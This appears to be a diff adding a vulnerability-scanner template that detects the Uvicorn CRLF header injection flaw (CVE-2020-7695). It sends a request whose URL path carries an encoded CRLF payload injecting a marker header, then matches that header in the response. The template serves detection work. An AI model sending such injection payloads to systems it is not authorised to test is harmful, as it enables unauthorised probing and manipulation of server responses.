@@ -1,0 +1,56 @@
+id: uvicorn-header-injection
+
+info:
+  name: Uvicorn HTTP Header Injection
+  author: nvsecurity
+  severity: medium
+  description: |
+    Uvicorn server is vulnerable to HTTP header injection through URL path encoding.
+    This vulnerability allows an attacker to inject additional HTTP response headers
+    by using CRLF sequences in the URL path.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-7695
+    - https://security.snyk.io/vuln/SNYK-PYTHON-UVICORN-570471
+    - https://github.com/advisories/GHSA-f97h-2pfx-f59f
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-113
+  metadata:
+    max-request: 1
+    verified: true
+    product: Uvicorn
+  tags: crlf,injection,uvicorn,headers
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/foo%0d%0abar:%20baz"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "(?i)bar:\\s*baz"
+
+      - type: status
+        status:
+          - 200
+          - 404
+          - 403
+          - 401
+          - 500
+
+      - type: word
+        part: header
+        words:
+          - "uvicorn"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: header
+        name: injected_header
+        regex:
+          - "bar:\\s*baz"
